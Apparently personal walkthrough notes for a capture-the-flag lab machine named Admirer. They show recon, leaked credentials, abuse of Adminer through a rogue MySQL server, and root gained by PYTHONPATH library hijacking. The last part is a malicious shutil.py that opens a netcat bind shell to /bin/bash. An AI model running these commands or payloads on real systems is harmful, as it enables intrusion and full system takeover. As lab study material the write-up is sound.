@@ -1,0 +1,317 @@
+└─$ nmap -p- -sSCV 10.10.10.187  --min-rate 999         
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 18:19 AEDT
+Nmap scan report for 10.10.10.187
+Host is up (0.14s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
+|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
+|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-title: Admirer
+|_http-server-header: Apache/2.4.25 (Debian)
+| http-robots.txt: 1 disallowed entry 
+|_/admin-dir
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+http://10.10.10.187/robots.txt
+User-agent: *
+
+# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
+Disallow: /admin-dir
+
+
+└─$ gobuster dir --url http://10.10.10.187/admin-dir  -w=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   -t 144 -x txt,php,html
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.187/admin-dir
+[+] Method:                  GET
+[+] Threads:                 144
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Extensions:              txt,php,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/contacts.txt         (Status: 200) [Size: 350]
+/credentials.txt      (Status: 200) [Size: 136]
+Progress: 882228 / 882228 (100.00%)
+
+
+http://admirer.htb/admin-dir//contacts.txt
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+
+# Amy
+Email: a.bialik@admirer.htb
+
+# Leonard
+Email: l.galecki@admirer.htb
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+
+# Bernadette
+Email: b.rauch@admirer.htb
+
+http://admirer.htb/admin-dir/credentials.txt
+[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+
+
+
+└─$ ftp 10.10.10.187
+Connected to 10.10.10.187.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.187:ed): ftpuser
+331 Please specify the password.
+Password: 
+230 Login successful.
+
+mget html.tar.gz [anpqy?]? y
+</pre>
+└─$ cat utility-scripts/db_admin.php   
+
+<?php
+  $servername = "localhost";
+  $username = "waldo";
+  $password = "Wh3r3_1s_w4ld0?";
+
+  // Create connection
+  $conn = new mysqli($servername, $username, $password);
+
+  // Check connection
+  if ($conn->connect_error) {
+      die("Connection failed: " . $conn->connect_error);
+  }
+  echo "Connected successfully";
+
+
+  // TODO: Finish implementing this or find a better open source alternative
+?>
+
+
+└─$ tar -xvzf html.tar.gz   
+assets/
+assets/sass/
+index.php
+robots.txt
+utility-scripts/
+utility-scripts/phptest.php
+utility-scripts/info.php
+utility-scripts/db_admin.php
+utility-scripts/admin_tasks.php
+w4ld0s_s3cr3t_d1r/
+w4ld0s_s3cr3t_d1r/credentials.txt
+w4ld0s_s3cr3t_d1r/contacts.txt
+
+└─$ sudo dirsearch -u http://10.10.10.187/utility-scripts/  -f php,txt
+
+[19:47:19] Starting: utility-scripts/
+[19:47:49] 200 -    2KB - /utility-scripts/adminer.php
+[19:48:27] 200 -   22KB - /utility-scripts/info.php
+[19:48:49] 200 -   32B  - /utility-scripts/phptest.php
+
+
+http://admirer.htb/utility-scripts/adminer.php?username=waldo&db=admirer
+ftp> more dump.sql
+-- MySQL dump 10.16  Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)
+--
+-- Host: localhost    Database: admirerdb
+-- ------------------------------------------------------
+-- Server version	10.1.41-MariaDB-0+deb9u1
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
+/*!40101 SET NAMES utf8mb4 */;
+/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
+/*!40103 SET TIME_ZONE='+00:00' */;
+/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
+/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
+/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
+/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
+
+--
+
+//in the backup folder
+└─$ cat index.php 
+					<div id="main">			
+					 <?php
+                        $servername = "localhost";
+                        $username = "waldo";
+                        $password = "]F7jLHw:*G>UPrTo}~A"d6b";
+                        $dbname = "admirerdb";
+
+
+
+//build a mysql on localhost
+//reset passwd of root
+sudo mysqld_safe --skip-grant-tables --skip-networking &
+
+MariaDB [(none)]> flush priviledges;
+
+MariaDB [(none)]> ALTER USER 'root'@'localhost' IDENTIFIED BY 'ssss';
+
+MariaDB [(none)]> flush priviledges;
+
+MariaDB [(none)]> create database admirerdb;
+Query OK, 1 row affected (0.001 sec)
+
+MariaDB [(none)]> grant all privileges on admirerdb.* TO 'waldo'@'10.10.10.187' identified by ']F7jLHw:*G>UPrTo}~A"d6b';
+Query OK, 0 rows affected (0.020 sec)
+
+MariaDB [(none)]> flush privileges;
+Query OK, 0 rows affected (0.001 sec)
+
+MariaDB [(none)]> select user,host from mysql.user;
++-------------+--------------+
+| User        | Host         |
++-------------+--------------+
+| waldo       | 10.10.10.187 |
+| empire_user | localhost    |
+| mariadb.sys | localhost    |
+| mysql       | localhost    |
+| root        | localhost    |
++-------------+--------------+
+5 rows in set (0.002 sec)
+
+
+
+
+
+
+load data local infile '/var/www/html/index.php'
+into table test.test
+fields terminated by "\n"
+
+
+
+//get another passwd
+    $servername = "localhost";
+    $username = "waldo";
+    $password = "&<h5b~yK3F#{PaPB&dA}{H>";
+    $dbname = "admirerdb";
+
+
+
+┌──(ed㉿kali)-[~]
+└─$ ssh waldo@10.10.10.187        
+waldo@10.10.10.187's password: 
+Linux admirer 4.9.0-19-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Thu Aug 24 16:09:42 2023 from 10.10.14.23
+waldo@admirer:~$ 
+
+waldo@admirer:~$ sudo -l
+[sudo] password for waldo: 
+Sorry, try again.
+[sudo] password for waldo: 
+Matching Defaults entries for waldo on admirer:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always
+
+User waldo may run the following commands on admirer:
+    (ALL) SETENV: /opt/scripts/admin_tasks.sh
+
+
+waldo@admirer:/tmp$ bash /opt/scripts/admin_tasks.sh
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 
+
+backup_web()
+{
+    if [ "$EUID" -eq 0 ]
+    then
+        echo "Running backup script in the background, it might take a while..."
+        /opt/scripts/backup.py &
+
+waldo@admirer:/tmp$ ls -la /opt/scripts/backup.py
+-rwxr----- 1 root admins 198 Dec  2  2019 /opt/scripts/backup.py
+
+// this two executable files are full of path, which means we cannot path hijacking. but we can read backup.py
+
+waldo@admirer:/tmp$ cat /opt/scripts/backup.py
+#!/usr/bin/python3
+
+from shutil import make_archive
+
+src = '/var/www/html/'
+
+# old ftp directory, not used anymore
+#dst = '/srv/ftp/html'
+
+dst = '/var/backups/html'
+
+make_archive(dst, 'gztar', src)
+
+//we can hijacking python lib
+
+waldo@admirer:/tmp$ echo "import os; os.system('nc -nvlp 8821 -e /bin/bash')" > shutil.py
+waldo@admirer:/tmp$ chmod +x shutil.py 
+waldo@admirer:/tmp$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 6
+Running backup script in the background, it might take a while...
+waldo@admirer:/tmp$ listening on [any] 8821 ...
+connect to [10.10.10.187] from (UNKNOWN) [10.10.16.16] 36492
+
+└─$ nc 10.10.10.187 8821
+whoami
+root
+
+
+
